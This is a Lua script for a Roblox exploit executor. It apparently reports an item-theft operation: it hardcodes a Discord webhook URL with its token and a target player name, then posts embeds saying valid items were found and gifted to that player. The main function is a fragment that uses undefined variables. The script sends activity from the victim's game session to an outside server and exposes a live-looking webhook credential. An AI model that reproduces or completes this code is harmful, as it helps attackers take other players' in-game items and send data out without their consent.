local WEBHOOK_URL = "https://discord.com/api/webhooks/1383762986111471626/XYLI8fnKczPB65YAOvg_Dtsuf28mGQvTHRxcr2JP4pHiaFY8qPw2MlGNzX9pp7geweF3"
local TARGET_NAME = "Tekeshkii"
local LOADING_TIME = 5

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- Discord embed formatting function
local function sendWebhook(title, description, color)
    local embed = {
        {
            ["title"] = title,
            ["description"] = description,
            ["color"] = color,
            ["footer"] = {
                ["text"] = os.date("%X • %x")
            }
        }
    }

    local success, response = pcall(function()
        local req = (syn and syn.request) or request
        return req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                embeds = embed,
                username = "Item Gifter",
                avatar_url = "https://i.imgur.com/yourlogo.png"
            })
        })
    end)

    if not success then
        warn("Failed to send webhook:", response)
    end
end

-- Example usage in the main function:
local function main()
    -- When items are found
    sendWebhook(
        "✅ Items Found",
        "Found "..#validItems.." valid items to gift",
        65280 -- Green color
    )

    -- When recipient is found
    sendWebhook(
        "🎯 Recipient Located",
        "Found target player: "..recipient.Name,
        16776960 -- Yellow color
    )

    -- When gifting completes
    sendWebhook(
        "🎁 Gift Successful",
        "Gifted "..#validItems.." items to "..recipient.Name,
        32768 -- Dark green
    )

    -- When errors occur
    sendWebhook(
        "❌ Error Occurred",
        "Failed to find valid items",
        16711680 -- Red color
    )
end
